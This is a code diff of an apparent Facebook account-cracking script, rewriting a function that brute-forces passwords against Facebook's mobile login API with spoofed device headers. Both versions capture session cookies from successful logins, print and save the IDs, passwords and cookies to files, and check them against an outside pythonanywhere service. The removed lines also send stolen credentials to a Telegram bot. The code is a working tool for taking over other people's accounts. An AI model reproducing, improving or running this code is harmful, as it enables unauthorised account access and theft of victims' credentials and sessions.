@@ -903,21 +903,22 @@ android_model1 = random.choice(['SM-M022G'])
 useragent = ('Mozilla/5.0 (Linux; Android {};{} Build/{}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 SamsungBrowser/7.4 Chrome/{} Mobile Safari/537.36'.format(android_version1, android_model1, build1, browser_version1))
 
 def m1(idf,pwv):
-    global loop, ok, cp
-    animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
-    sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
-    sys.stdout.flush()
-    for pw in pwv: 
-        try:
-            session = requests.Session()
-            date = {
+	global loop,oks
+	try:
+		for pas in pwv:
+			session = requests.Session()
+			animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
+			sys.stdout.write(f'\r{P} [{animasi}-{H}M1{P}] ({B}%s{P}){U}+{H}OK{P}({GREEN}%s{P})'%(loop,ok)),
+			sys.stdout.flush()
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,300))+str(random.randint(11,555)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/{density=2.25,width=720,height=1400};FBLC/en_Qaau_US;FBRV/369757394;FBCR/Vi India;FBMF/Realme; FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+			data = {
 			"adid": str(uuid.uuid4()).upper(),
 			"format": "json",
 			"device_id" : str(uuid.uuid4()).upper(),
 			"family_device_id": str(uuid.uuid4()).upper(),
 			"secure_family_device_id": str(uuid.uuid4()).upper(),
-			"email": ids,
-			"password": pw,
+			"email": idf,
+			"password": pas,
 			"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
 			'sim_serials': "['80973453345210784798']",
 			'openid_flow': 'android_login',
@@ -936,9 +937,10 @@ def m1(idf,pwv):
 			"method": "auth.login",
 			"fb_api_req_friendly_name": "authenticate",
 			'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
-			"api_key": "882a8490361da98702bf97a021ddc14d",}
-            respons ={
-			'User-Agent': 'Mozilla/5.0 (Linux; Android 13; SM-G960N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4361.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93;',
+			"api_key": "882a8490361da98702bf97a021ddc14d",
+			}
+			head = {
+			'User-Agent': ua,
 			'Content-Type': 'application/x-www-form-urlencoded',
 			'Host': 'graph.facebook.com',
 			'Priority': 'u=3, i',
@@ -957,37 +959,41 @@ def m1(idf,pwv):
 			'X-FB-Client-IP': 'True',
 			'X-FB-Server-Cluster': 'True',
 			'Content-Length': '847',
-			'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
-            po = session.post("https://b-graph.facebook.com/auth/login",data=date, headers=respons,  allow_redirects=False).json()
-            if 'session_key' in po:
-             uid = str(po['uid'])
-             ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-             ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-             cookie = f"sb={ssbb};{ckkk}"
-             get_req = str(requests.get(f"https://shishirx.pythonanywhere.com/lock?uid={uid}").text)
-            if 'live' in get_req:
-                print(f'\r\r{P}[ATOM-OK]: {uid} | {pw}')
-                print(f"\r\033[38;5;196mCOOKIES=[🤖]: {cookie} \33[1;36m")
-                open('/sdcard/ATOM-M6-live-OK.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
-                statusok = (f" {uid} | {pw} | {coki} ")
-                requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
-                ok+=1 
-                break
-            if 'lock' in reqx:
-                print(f'\r\r{p}[ATOM-OK]: {uid} | {pw}')
-                open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'\n')
-                break
-            elif 'www.facebook.com' in po['error']['message']:  
-                uid = str(po['error']['error_data']['uid'])
-                print(f'\r\r{P}[ATOM-OK]: {uid} | {pw}')
-                open('/sdcard/ATOM-cp.txt','a').write(uid+'|'+pw+'\n')
-                break
-            else:
-                continue
-        except requests.exceptions.ConnectionError:
-            time.sleep(31)
-    loop+=1
-
+			'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+			}
+			po = session.post("https://b-graph.facebook.com/auth/login",data=data, headers=head, allow_redirects=False).json()
+			if 'session_key' in po:
+					uid = str(po['uid'])
+					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+					cookie = f"sb={ssbb};{ckkk}"
+					get_req = str(requests.get(f"https://livedeadsegs.pythonanywhere.com/segs_uid?uid={uid}").text)
+					if 'LIVE' in get_req:
+						print('\r\r\033[1;32m [DARK-OK] '+uid+' | '+pas)
+						print(' \33[1;33m[Cookies🍪] : '+cookie)
+						open('/sdcard/DARK/DARK-RANDOM-OK.txt','a').write(uid+'|'+pas+'\n')
+						open('/sdcard/DARK/DARK-RANDOM-OK-COOKIE.txt','a').write(uid+'|'+pas+'|'+cookie+'\n')
+						oks.append(uid)
+						break
+					if 'DEAD' in get_req:
+						#print('\r\033[1;91m [LOCK] '+uid+' | '+pas+'\033[1;97m')
+						file_path = os.path.join(folder_path, 'LOCK-IDS.txt')
+						break
+			elif 'www.facebook.com' in po['error']['message']:
+					uid = str(po['error']['error_data']['uid'])
+					print('\r\033[1;91m [DARK-CP] '+uid+' | '+pas+'\033[1;97m')
+					file_path = os.path.join(folder_path, 'DARK-CP.txt')
+					with open(file_path, 'a') as file:
+						file.write(uid+'|'+pas+'\n')
+					cps.append(uid)
+					break
+			else:
+				continue
+		loop+=1
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
+		pass
 def m2(idf,pwv):
  global loop,ok,cp
  animasi = random.choice(["\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA","\x1b[1;97mBITHIKA","\x1b[1;91mBITHIKA","\x1b[1;92mBITHIKA","\x1b[1;93mBITHIKA","\x1b[1;94mBITHIKA","\x1b[1;95mBITHIKA","\x1b[1;96mBITHIKA"])
